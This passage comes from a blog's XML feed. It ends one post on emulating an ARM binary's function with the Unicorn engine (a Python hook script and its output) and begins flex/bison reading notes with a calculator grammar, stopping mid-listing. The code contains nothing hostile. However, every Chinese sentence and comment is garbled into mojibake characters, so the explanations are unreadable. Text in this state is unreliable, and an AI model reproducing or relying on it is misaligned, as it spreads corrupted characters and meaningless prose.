<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  v3 = ccc(<span class="number">0x2710</span>u, (<span class="keyword">int</span>)argv, (<span class="keyword">int</span>)envp);</span><br><span class="line">  <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;unk_745A4, v3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨æ²¡æœ‰armç¯å¢ƒçš„æƒ…å†µä¸‹ï¼Œä½¿ç”¨unicornæ¥å¾—å‡ºè¿™ä¸ªå‡½æ•°ç»“ç®—ç»“æœ-ã€‚- è™½ç„¶æˆ‘æœ‰armç¯å¢ƒ 2333333</p>
<p>æœäº†ä¸€ä¸‹armä¼ å‚çš„æ–¹å¼ï¼š</p>
<ol>
<li><p>è¾“å…¥å‚æ•°é€šè¿‡r0-r3ä¼ é€’ï¼Œå¤šä½™çš„æ”¾å…¥å †æ ˆä¸­ï¼›è¿”å›å€¼æ”¾å…¥r0ï¼Œä¸å¤Ÿçš„è¯æ”¾å…¥{r0,r1}æˆ–è€…{r0,r1,r2,r3}ï¼Œæ¯”å¦‚ï¼š<br>int foo(int a, int b, int c, int d), è¾“å…¥ï¼šr0 = a, r1 = b, r2 = c, r3 = dï¼Œè¿”å›ï¼šr0 = ç±»å‹ä¸ºintçš„retvalue<br>int <em>foo(char a, double b, int c, char d), è¾“å…¥ï¼šr0 = a, r1ç”¨äºå¯¹é½(double è¦æ±‚8å­—èŠ‚å¯¹é½), b = {r2, r3}ï¼Œcæ”¾åœ¨å †æ ˆçš„sp[0]ä½ç½®ï¼Œdæ”¾åœ¨å †æ ˆçš„sp[4]ä½ç½®ï¼Œè¿™é‡Œçš„spæ˜¯æŒ‡è¿›å…¥å‡½æ•°æ—¶çš„spï¼›è¿”å›ï¼šr0 = ç±»å‹ä¸ºint </em>çš„retvalue</p>
</li>
<li><p>æ³¨æ„å¦‚æœè¿”å›å€¼æ˜¯ç»“æ„ä½“ï¼Œæƒ…å†µæœ‰äº›ç‰¹æ®Šï¼š<br>struct client foo(int a, char b, float c), è¾“å…¥ï¼šr0 = ä¸€ä¸ªstrcut client <em>å˜é‡ï¼Œç”±è°ƒç”¨è€…ç»™å‡º, r1 = a, r2 = b, r3 = cï¼›è¿”å›ï¼šstrcut client </em>å˜é‡ï¼Œå’Œè°ƒç”¨è€…ç»™çš„ä¸€æ ·</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.arm_const <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(name) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">u32</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">"I"</span>, data)[<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p32</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">"I"</span>, num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mu = Uc (UC_ARCH_ARM, UC_MODE_LITTLE_ENDIAN)</span><br><span class="line"></span><br><span class="line">BASE = <span class="number">0x10000</span></span><br><span class="line">STACK_ADDR = <span class="number">0x300000</span></span><br><span class="line">STACK_SIZE = <span class="number">1024</span>*<span class="number">1024</span></span><br><span class="line"></span><br><span class="line">mu.mem_map(BASE, <span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">mu.mem_map(STACK_ADDR, STACK_SIZE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mu.mem_write(BASE, read(<span class="string">"./task4_arm"</span>))</span><br><span class="line"></span><br><span class="line">mu.reg_write(UC_ARM_REG_SP, STACK_ADDR + STACK_SIZE/<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">instructions_skip_list = []</span><br><span class="line"></span><br><span class="line">CCC_START = <span class="number">0x000104D0</span></span><br><span class="line">CCC_END   = <span class="number">0x00010580</span></span><br><span class="line"></span><br><span class="line">stack = []                                          <span class="comment"># Stack for storing the arguments</span></span><br><span class="line">d = &#123;&#125;                                              <span class="comment"># Dictionary that holds return values for given function arguments</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_code</span><span class="params">(mu, address, size, user_data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address == CCC_START:                        <span class="comment"># Are we at the beginning of ccc function?</span></span><br><span class="line">        arg0 = mu.reg_read(UC_ARM_REG_R0)           <span class="comment"># Read the first argument. it is passed by R0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> arg0 <span class="keyword">in</span> d:                               <span class="comment"># Check whether return value for this function is already saved.</span></span><br><span class="line">            ret = d[arg0]</span><br><span class="line">            mu.reg_write(UC_ARM_REG_R0, ret)        <span class="comment"># Set return value in R0</span></span><br><span class="line">            mu.reg_write(UC_ARM_REG_PC, <span class="number">0x105BC</span>)    <span class="comment"># Set PC to point at "BX LR" instruction. We want to return from fibonacci function</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            stack.append(arg0)                      <span class="comment"># If return value is not saved for this argument, add it to stack.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> address == CCC_END:</span><br><span class="line">        arg0 = stack.pop()                          <span class="comment"># We know arguments when exiting the function</span></span><br><span class="line"></span><br><span class="line">        ret = mu.reg_read(UC_ARM_REG_R0)            <span class="comment"># Read the return value (R0)</span></span><br><span class="line">        d[arg0] = ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mu.hook_add(UC_HOOK_CODE, hook_code)</span><br><span class="line"></span><br><span class="line">mu.emu_start(<span class="number">0x00010584</span>, <span class="number">0x000105A8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"ret:&#123;0&#125;"</span>.format(mu.reg_read(UC_ARM_REG_R1))</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># muhe @ muheMacBookPro in ~/Downloads [15:34:12]</span></span><br><span class="line">$ python task4.py</span><br><span class="line">ret:2635833876</span><br></pre></td></tr></table></figure>
<h4 id="0x05-å‚è€ƒ"><a href="#0x05-å‚è€ƒ" class="headerlink" title="0x05: å‚è€ƒ"></a>0x05: å‚è€ƒ</h4><p><a href="http://eternal.red/2018/unicorn-engine-tutorial/" target="_blank" rel="noopener">Unicorn Engine tutorial</a></p>
<p><a href="http://blog.csdn.net/ayu_ag/article/details/50734282" target="_blank" rel="noopener">armå¹³å°å‡½æ•°ä¼ é€’å‚æ•°ï¼Œåæ±‡ç¼–å®ä¾‹åˆ†æ</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00-å…³äºunicorn-engine&quot;&gt;&lt;a href=&quot;#0x00-å…³äºunicorn-engine&quot; class=&quot;headerlink&quot; title=&quot;0x00:å…³äºunicorn engine&quot;&gt;&lt;/a&gt;0x00:å…³äºunicorn engine&lt;/h4&gt;&lt;p&gt;Unicorn Engineæ˜¯ä¸€ä¸ªæ¨¡æ‹Ÿå™¨(emulator)ï¼Œç®€å•çš„æ¥è¯´å°±æ˜¯å¯ä»¥æ¨¡æ‹Ÿæ‰§è¡Œç¨‹åºorç‰‡æ®µçš„ä»£ç ã€‚å¯¹äºé€†å‘åˆ†ææ¥è¯´å¾ˆæœ‰ç”¨ï¼Œæ¯”å¦‚åˆ†ææŸä¸ªç‰‡æ®µçš„ä»£ç çš„ä½œç”¨ï¼›å¯¹äºæ¼æ´æŒ–æ˜é€‰æ‰‹æ¥è¯´ï¼Œå‰ä¸€æ®µæ—¶é—´çš„unicorn-aflç€å®äº®çœ¼ï¼Œä¸è¿‡æœ‰å¸¦æ›´æ·±å…¥çš„ç ”ç©¶ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="study" scheme="http://o0xmuhe.me/tags/study/"/>
    
      <category term="unicorn engine" scheme="http://o0xmuhe.me/tags/unicorn-engine/"/>
    
      <category term="tools" scheme="http://o0xmuhe.me/tags/tools/"/>
    
  </entry>
  
  <entry>
    <title>flex_bisonè¯»ä¹¦ç¬”è®°</title>
    <link href="http://o0xmuhe.me/2018/01/06/flex-bison%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    <id>http://o0xmuhe.me/2018/01/06/flex-bisonè¯»ä¹¦ç¬”è®°/</id>
    <published>2018-01-06T12:23:17.000Z</published>
    <updated>2018-04-06T08:32:35.950Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00-èµ·å› "><a href="#0x00-èµ·å› " class="headerlink" title="0x00: èµ·å› "></a>0x00: èµ·å› </h4><p>å·¥ä½œä¸Šçš„ä¸€äº›åŸå› éœ€è¦å­¦ä¹ ä¸€ä¸‹ã€‚åšä¸ªè®°å½•ç£ä¿ƒè‡ªå·±è¯»ä¹¦å­¦ä¹ ï¼Œå¥½å¥½å­¦ä¹ ã€‚</p>
<a id="more"></a>
<h4 id="0x01-ä¸€äº›æ¦‚å¿µ"><a href="#0x01-ä¸€äº›æ¦‚å¿µ" class="headerlink" title="0x01: ä¸€äº›æ¦‚å¿µ"></a>0x01: ä¸€äº›æ¦‚å¿µ</h4><h5 id="è¯­å¥å’Œè¡¨è¾¾å¼"><a href="#è¯­å¥å’Œè¡¨è¾¾å¼" class="headerlink" title="è¯­å¥å’Œè¡¨è¾¾å¼"></a>è¯­å¥å’Œè¡¨è¾¾å¼</h5><ul>
<li>è¡¨è¾¾å¼ï¼ˆExpressionï¼‰æœ‰å€¼ï¼Œè€Œè¯­å¥ï¼ˆStatementï¼‰ä¸æ€»æœ‰ã€‚<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">è¡¨è¾¾å¼æ˜¯å¯ä»¥è¢«æ±‚å€¼çš„ä»£ç ï¼Œè€Œè¯­å¥æ˜¯ä¸€æ®µå¯æ‰§è¡Œä»£ç ã€‚</span><br><span class="line">å› ä¸ºè¡¨è¾¾å¼å¯è¢«æ±‚å€¼ï¼Œæ‰€ä»¥å®ƒå¯å†™åœ¨èµ‹å€¼è¯­å¥ç­‰å·çš„å³ä¾§ã€‚</span><br><span class="line">è€Œè¯­å¥ä¸ä¸€å®šæœ‰å€¼ï¼Œæ‰€ä»¥åƒimportã€forå’Œbreakç­‰è¯­å¥å°±ä¸èƒ½è¢«ç”¨äºèµ‹å€¼ã€‚</span><br><span class="line">Pythonçš„è¯­å¥åˆ†ä¸ºä¸¤å¤§ç±»ï¼šç®€å•å’Œå¤åˆè¯­å¥ã€‚</span><br><span class="line">ç®€å•è¯­å¥æ˜¯æŒ‡ä¸€é€»è¾‘è¡Œçš„ä»£ç ã€‚ä¾‹å¦‚è¡¨è¾¾å¼è¯­å¥ã€èµ‹å€¼è¯­å¥å’Œreturnè¯­å¥ç­‰ã€‚</span><br><span class="line">å¤åˆè¯­å¥æ˜¯æŒ‡åŒ…å«ã€å½±å“æˆ–æ§åˆ¶ä¸€ç»„è¯­å¥çš„ä»£ç ã€‚ä¾‹å¦‚ifã€tryå’Œclassè¯­å¥ç­‰ã€‚</span><br><span class="line">è¡¨è¾¾å¼æœ¬èº«å¯ä»¥ä½œä¸ºè¡¨è¾¾å¼è¯­å¥ï¼Œä¹Ÿèƒ½ä½œä¸ºèµ‹å€¼è¯­å¥çš„å³å€¼æˆ–ifè¯­å¥çš„æ¡ä»¶ç­‰ï¼Œæ‰€ä»¥è¡¨è¾¾å¼å¯ä»¥ä½œä¸ºè¯­å¥çš„ç»„æˆéƒ¨åˆ†ï¼Œä½†ä¸æ˜¯å¿…é¡»æˆåˆ†ï¼ˆä¾‹å¦‚continueè¯­å¥ï¼‰ã€‚</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h5 id="å·¦é€’å½’"><a href="#å·¦é€’å½’" class="headerlink" title="å·¦é€’å½’"></a>å·¦é€’å½’</h5><pre><code>ä¸€ä¸ªæ–‡æ³•æ˜¯å·¦é€’å½’çš„ï¼Œè‹¥æˆ‘ä»¬å¯ä»¥æ‰¾å‡ºå…¶ä¸­å­˜åœ¨æŸéç»ˆç«¯ç¬¦å·Aï¼Œæœ€ç»ˆä¼šæ¨å¯¼å‡ºæ¥çš„å¥å‹(sentential form)é‡Œé¢åŒ…å«ä»¥è‡ªå·±ä¸ºæœ€å·¦ç¬¦å·(left-symbol)çš„å¥å‹
</code></pre><ol>
<li>ç›´æ¥å·¦é€’å½’</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Expr ----&gt; Expr + Term</span><br></pre></td></tr></table></figure>
<p>ä¸¾ä¸ªä¾‹å­ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A ---&gt; Aa|C</span><br></pre></td></tr></table></figure>
<ol>
<li>é—´æ¥å·¦é€’å½’</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A ---&gt; Ba|C</span><br><span class="line">B ---&gt; Ab|D</span><br></pre></td></tr></table></figure>
<p>è¿™ç§ä¼šäº§ç”Ÿï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A ---&gt; Ba ---&gt; Aba ---&gt; ...</span><br></pre></td></tr></table></figure></p>
<h4 id="0x02-é«˜çº§è®¡ç®—å™¨çš„å®ç°"><a href="#0x02-é«˜çº§è®¡ç®—å™¨çš„å®ç°" class="headerlink" title="0x02: é«˜çº§è®¡ç®—å™¨çš„å®ç°"></a>0x02: é«˜çº§è®¡ç®—å™¨çš„å®ç°</h4><h5 id="å…ˆçœ‹è¯­æ³•åˆ†æçš„éƒ¨åˆ†ï¼š"><a href="#å…ˆçœ‹è¯­æ³•åˆ†æçš„éƒ¨åˆ†ï¼š" class="headerlink" title="å…ˆçœ‹è¯­æ³•åˆ†æçš„éƒ¨åˆ†ï¼š"></a>å…ˆçœ‹è¯­æ³•åˆ†æçš„éƒ¨åˆ†ï¼š</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">$ cat fb3<span class="number">-2.</span>y</span><br><span class="line"><span class="comment">/* Companion source code for "flex &amp; bison", published by O'Reilly</span></span><br><span class="line"><span class="comment"> * Media, ISBN 978-0-596-15597-1</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2009, Taughannock Networks. All rights reserved.</span></span><br><span class="line"><span class="comment"> * See the README file for license conditions and contact info.</span></span><br><span class="line"><span class="comment"> * $Header: /home/johnl/flnb/code/RCS/fb3-2.y,v 2.1 2009/11/08 02:53:18 johnl Exp $</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/* calculator with AST */</span></span><br><span class="line"></span><br><span class="line">%&#123;</span><br><span class="line"><span class="meta">#  <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">include</span> <span class="meta-string">"fb3-2.h"</span></span></span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">%<span class="keyword">union</span> &#123;</span><br><span class="line">  <span class="keyword">struct</span> ast *a;</span><br><span class="line">  <span class="keyword">double</span> d;</span><br><span class="line">  <span class="keyword">struct</span> symbol *s;        <span class="comment">/* which symbol */</span></span><br><span class="line">  <span class="keyword">struct</span> symlist *sl;</span><br><span class="line">  <span class="keyword">int</span> fn;            <span class="comment">/* which function */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* declare tokens */</span> è¡¨æ˜ç±»å‹</span><br><span class="line">%token &lt;d&gt; NUMBER</span><br><span class="line">%token &lt;s&gt; NAME</span><br><span class="line">%token &lt;fn&gt; FUNC</span><br><span class="line">%token EOL</span><br><span class="line"></span><br><span class="line">%token IF THEN ELSE WHILE DO LET</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//rightã€leftè¡¨æ˜äº†ç»“åˆé¡ºåºï¼Œå³ä¼˜å…ˆçº§</span></span><br><span class="line">%nonassoc &lt;fn&gt; CMP</span><br><span class="line">%right <span class="string">'='</span></span><br><span class="line">%left <span class="string">'+'</span> <span class="string">'-'</span></span><br><span class="line">%left <span class="string">'*'</span> <span class="string">'/'</span></span><br><span class="line">%nonassoc <span class="string">'|'</span> UMINUS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//æŠŠå€¼&lt;a&gt;èµ‹å€¼ç»™äº† stmt list explist ä¸‰è€…</span></span><br><span class="line">%type &lt;a&gt; <span class="built_in">exp</span> stmt <span class="built_in">list</span> explist</span><br><span class="line"><span class="comment">//åŒç†</span></span><br><span class="line">%type &lt;sl&gt; symlist</span><br><span class="line"></span><br><span class="line">%start calclist</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¯­å¥ï¼Œè°ƒç”¨ç›¸å¯¹åº”çš„æ–¹æ³•ï¼Œç”ŸæˆAST</span></span><br><span class="line">stmt: IF <span class="built_in">exp</span> THEN <span class="built_in">list</span>           &#123; $$ = newflow(<span class="string">'I'</span>, $<span class="number">2</span>, $<span class="number">4</span>, <span class="literal">NULL</span>); &#125;</span><br><span class="line">   | IF <span class="built_in">exp</span> THEN <span class="built_in">list</span> ELSE <span class="built_in">list</span>  &#123; $$ = newflow(<span class="string">'I'</span>, $<span class="number">2</span>, $<span class="number">4</span>, $<span class="number">6</span>); &#125;</span><br><span class="line">   | WHILE <span class="built_in">exp</span> DO <span class="built_in">list</span>           &#123; $$ = newflow(<span class="string">'W'</span>, $<span class="number">2</span>, $<span class="number">4</span>, <span class="literal">NULL</span>); &#125;</span><br><span class="line">   | <span class="built_in">exp</span></span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å³é€’å½’</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>: <span class="comment">/* nothing */</span> &#123; $$ = <span class="literal">NULL</span>; &#125;</span><br><span class="line">   | stmt <span class="string">';'</span> <span class="built_in">list</span> &#123; <span class="keyword">if</span> ($<span class="number">3</span> == <span class="literal">NULL</span>)</span><br><span class="line">                    $$ = $<span class="number">1</span>;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">            $$ = newast(<span class="string">'L'</span>, $<span class="number">1</span>, $<span class="number">3</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">   ;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¡¨è¾¾å¼çš„astæ„å»º</span></span><br><span class="line"><span class="built_in">exp</span>: <span class="built_in">exp</span> CMP <span class="built_in">exp</span>          &#123; $$ = newcmp($<span class="number">2</span>, $<span class="number">1</span>, $<span class="number">3</span>); &#125;</span><br><span class="line">   | <span class="built_in">exp</span> <span class="string">'+'</span> <span class="built_in">exp</span>          &#123; $$ = newast(<span class="string">'+'</span>, $<span class="number">1</span>,$<span class="number">3</span>); &#125;</span><br><span class="line">   | <span class="built_in">exp</span> <span class="string">'-'</span> <span class="built_in">exp</span>          &#123; $$ = newast(<span class="string">'-'</span>, $<span class="number">1</span>,$<span class="number">3</span>);&#125;</span><br><span class="line">   | <span class="built_in">exp</span> <span class="string">'*'</span> <span class="built_in">exp</span>          &#123; $$ = newast(<span class="string">'*'</span>, $<span class="number">1</span>,$<span class="number">3</span>); &#125;</span><br><span class="line">   | <span class="built_in">exp</span> <span class="string">'/'</span> <span class="built_in">exp</span>          &#123; $$ = newast(<span class="string">'/'</span>, $<span class="number">1</span>,$<span class="number">3</span>); &#125;</span><br><span class="line">   | <span class="string">'|'</span> <span class="built_in">exp</span>              &#123; $$ = newast(<span class="string">'|'</span>, $<span class="number">2</span>, <span class="literal">NULL</span>); &#125;</span><br><span class="line">   | <span class="string">'('</span> <span class="built_in">exp</span> <span class="string">')'</span>          &#123; $$ = $<span class="number">2</span>; &#125;</span><br><span class="line">   | <span class="string">'-'</span> <span class="built_in">exp</span> %prec UMINUS &#123; $$ = newast(<span class="string">'M'</span>, $<span class="number">2</span>, <span class="literal">NULL</span>); &#125;</span><br><span class="line">   | NUMBER               &#123; $$ = newnum($<span class="number">1</span>); &#125;</span><br><span class="line">   | FUNC <span class="string">'('</span> explist <span class="string">')'</span> &#123; $$ = newfunc($<span class="number">1</span>, $<span class="number">3</span>); &#125;</span><br><span class="line">   | NAME                 &#123; $$ = newref($<span class="number">1</span>); &#125;</span><br><span class="line">   | NAME <span class="string">'='</span> <span class="built_in">exp</span>         &#123; $$ = newasgn($<span class="number">1</span>, $<span class="number">3</span>); &#125;</span><br><span class="line">   | NAME <span class="string">'('</span> explist <span class="string">')'</span> &#123; $$ = newcall($<span class="number">1</span>, $<span class="number">3</span>); &#125;</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¡¨è¾¾å¼åˆ—è¡¨</span></span><br><span class="line">explist: <span class="built_in">exp</span></span><br><span class="line"> | <span class="built_in">exp</span> <span class="string">','</span> explist  &#123; $$ = newast(<span class="string">'L'</span>, $<span class="number">1</span>, $<span class="number">3</span>); &#125;</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ç¬¦å·åˆ—è¡¨ï¼Œç”¨äºå‡½æ•°è°ƒç”¨ï¼Œå³é€’å½’çš„</span></span><br><span class="line">symlist: NAME       &#123; $$ = newsymlist($<span class="number">1</span>, <span class="literal">NULL</span>); &#125;</span><br><span class="line"> | NAME <span class="string">','</span> symlist &#123; $$ = newsymlist($<span class="number">1</span>, $<span class="number">3</span>); &#125;</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//è®¡ç®—å™¨çš„é¡¶å±‚è§„åˆ™</span></span><br><span class="line"></span><br><span class="line">calclist: <span class="comment">/* nothing */</span></span><br><span class="line">  | calclist stmt EOL &#123;</span><br><span class="line">    <span class="keyword">if</span>(debug) dumpast($<span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"= %4.4g\n&gt; "</span>, eval($<span class="number">2</span>));</span><br><span class="line">     treefree($<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//è¯†åˆ«ä¸€ä¸ªå‡½æ•°å£°æ˜ let xxx() = xxx è¿™æ ·çš„</span></span><br><span class="line">  | calclist LET NAME <span class="string">'('</span> symlist <span class="string">')'</span> <span class="string">'='</span> <span class="built_in">list</span> EOL &#123;</span><br><span class="line">                       dodef($<span class="number">3</span>, $<span class="number">5</span>, $<span class="number">8</span>);</span><br><span class="line">                       <span class="built_in">printf</span>(<span class="string">"Defined %s\n&gt; "</span>, $<span class="number">3</span>-&gt;name); &#125;</span><br><span class="line"></span><br><span class="line">  | calclist error EOL &#123; yyerrok; <span class="built_in">printf</span>(<span class="string">"&gt; "</span>); &#125;</span><br><span class="line"> ;</span><br><span class="line">%%</span><br></pre></td></tr></table></figure>
<h5 id="è¯æ³•åˆ†æéƒ¨åˆ†ï¼š"><a href="#è¯æ³•åˆ†æéƒ¨åˆ†ï¼š" class="headerlink" title="è¯æ³•åˆ†æéƒ¨åˆ†ï¼š"></a>è¯æ³•åˆ†æéƒ¨åˆ†ï¼š</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span 